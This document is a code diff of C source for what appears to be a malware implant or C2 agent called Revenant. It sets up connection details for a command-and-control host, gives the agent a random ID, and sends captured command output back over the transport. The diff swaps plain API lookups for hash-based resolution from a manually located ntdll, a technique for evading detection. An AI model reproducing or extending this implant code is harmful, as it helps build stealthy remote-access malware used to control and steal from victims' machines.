@@ -1,41 +1,38 @@
-#include <Revnt.h>
+#include "Asm.h"
+#include "Core.h"
+#include "Config.h"
+#include "Package.h"
+#include "Command.h"
+#include "Revenant.h"
+#include "Obfuscation.h"
 
-#include <Core.h>
-#include <Config.h>
-#include <Package.h>
-#include <Command.h>
-#include <RevntStrings.h>
-#include <ObfuscateStrings.h>
+#include <stdio.h>
 
-
-VOID RevntInit()
-{
-    // DeObf Arrays
-    BYTE local_sRtlRandomEx[12];
-    BYTE local_sRtlGetVersion[14];
-
+VOID RvntInit() {
     // Init Connection info
     Instance.Config.Transport.UserAgent = CONFIG_USER_AGENT;
     Instance.Config.Transport.Host      = CONFIG_HOST;
     Instance.Config.Transport.Port      = CONFIG_PORT;
     Instance.Config.Transport.Secure    = CONFIG_SECURE;
 
-
     // Init Win32
+#if CONFIG_ARCH == x64
+    void *ntdll_base = get_ntdll_64();
+#else
+    void *ntdll_base = get_ntdll_32();
+#endif
 
-    Instance.Win32.RtlRandomEx   = (ULONG (*)(PULONG)) GetProcAddress(GetModuleHandleA(sNtdll), sRtlRandomEx(local_sRtlRandomEx));
-    Instance.Win32.RtlGetVersion = (void (*)(POSVERSIONINFOEXW)) GetProcAddress(GetModuleHandleA(sNtdll),
-                                                                                sRtlGetVersion(local_sRtlGetVersion));
+    Instance.Win32.RtlRandomEx   = get_proc_address_by_hash(ntdll_base, RtlRandomEx_CRC32B);
+    Instance.Win32.RtlGetVersion = get_proc_address_by_hash(ntdll_base, RtlGetVersion_CRC32B);
 
     Instance.Session.AgentID = RandomNumber32();
     Instance.Config.Sleeping = CONFIG_SLEEP;
 
     _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
-    _tprintf( "Magic Value => %x\0\n", REVNT_MAGIC_VALUE );
+    _tprintf( "Magic Value => %x\n", RVNT_MAGIC_VALUE );
 }
 
-VOID AnonPipeRead( HANDLE hSTD_OUT_Read )
-{
+void AnonPipeRead( HANDLE hSTD_OUT_Read ) {
     PPACKAGE Package         = NULL;
     LPVOID   pOutputBuffer   = NULL;
     UCHAR    buf[ 1025 ]     = { 0 };
@@ -45,38 +42,32 @@ VOID AnonPipeRead( HANDLE hSTD_OUT_Read )
 
     pOutputBuffer = LocalAlloc( LPTR, sizeof(LPVOID) );
 
-    do
-    {
+    do {
         SuccessFul = ReadFile( hSTD_OUT_Read, buf, 1024, &dwRead, NULL );
-
         if ( dwRead == 0)
             break;
 
         pOutputBuffer = LocalReAlloc(
-            pOutputBuffer,
-            dwBufferSize + dwRead,
-            LMEM_MOVEABLE | LMEM_ZEROINIT
+                pOutputBuffer,
+                dwBufferSize + dwRead,
+                LMEM_MOVEABLE | LMEM_ZEROINIT
         );
 
         dwBufferSize += dwRead;
-
         memcpy( pOutputBuffer + ( dwBufferSize - dwRead ), buf, dwRead );
         memset( buf, 0, dwRead );
-
     } while ( SuccessFul == TRUE );
 
     Package = PackageCreate( COMMAND_OUTPUT );
 
     PackageAddBytes( Package, pOutputBuffer, dwBufferSize );
     PackageTransmit( Package, NULL, NULL );
-
     memset( pOutputBuffer, 0, dwBufferSize );
     LocalFree( pOutputBuffer );
     pOutputBuffer = NULL;
 }
 
-ULONG RandomNumber32( VOID )
-{
+ULONG RandomNumber32(void) {
     ULONG Seed = 0;
 
     Seed = GetTickCount();
